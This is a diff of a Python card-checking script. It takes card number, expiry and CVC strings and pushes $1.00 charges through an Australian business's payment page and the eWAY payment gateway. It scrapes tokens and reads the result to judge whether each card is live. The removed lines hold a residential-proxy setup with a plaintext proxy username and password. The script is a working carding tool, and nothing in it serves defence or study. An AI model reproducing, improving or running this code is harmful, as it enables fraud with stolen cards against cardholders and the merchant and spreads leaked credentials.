@@ -1,10 +1,7 @@
 import requests,re
 import random
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_184b6dff-zone-ccworld:tnkilbv66jns"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
+	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -12,8 +9,6 @@ def Tele(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
-	if "01" or "02" or "03" or "04" or "05" or "06" or "07" or "08" or "09" in mm:
-		mm = mm.split("0")[1]
 	r = requests.session()
 
 	random_amount1 = random.randint(1, 9)
@@ -35,7 +30,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	        
-	response = session.get('https://www.katieroberts.com.au/payments/', headers=headers)
+	response = requests.get('https://www.katieroberts.com.au/payments/', headers=headers)
 	        
 	csrf = re.search(r'name="csrf" value="(.*?)"', response.text).group(1)
 	#print(csrf)
@@ -78,7 +73,7 @@ def Tele(ccx):
 	    'krccAmount': '1.00',
 	}
 	        
-	response = session.post('https://www.katieroberts.com.au/payments/', params=params, headers=headers, data=data)
+	response = requests.post('https://www.katieroberts.com.au/payments/', params=params, headers=headers, data=data)
 	        
 	AccessCode = re.search(r"var mpAccessCode = '(.*?)'", response.text).group(1)
 	#print(AccessCode)
@@ -143,7 +138,7 @@ def Tele(ccx):
 	    'EWAY_CARDCVN': f'{cvc}',
 	}
 	        
-	response = session.post(
+	response = requests.post(
 	    'https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment',
 	    headers=headers,
 	    data=data,
@@ -169,7 +164,7 @@ def Tele(ccx):
 	    'AccessCode': f'{AccessCode}',
 	}
 	        
-	response = session.get(
+	response = requests.get(
 	    'https://secure.ewaypayments.com/sharedpage/sharedpayment/Result',
 	    params=params,
 	    headers=headers,
@@ -196,7 +191,7 @@ def Tele(ccx):
 	    'AccessCode': f'{AccessCode}',
 	}
 	        
-	response = session.get('https://www.katieroberts.com.au/payments/', params=params, headers=headers)
+	response = requests.get('https://www.katieroberts.com.au/payments/', params=params, headers=headers)
 	        
 	result = re.search(r'<h2 class="padding_L_20px padding_B_25px">(.*?)</h2>', response.text).group(1)
 	return (result)
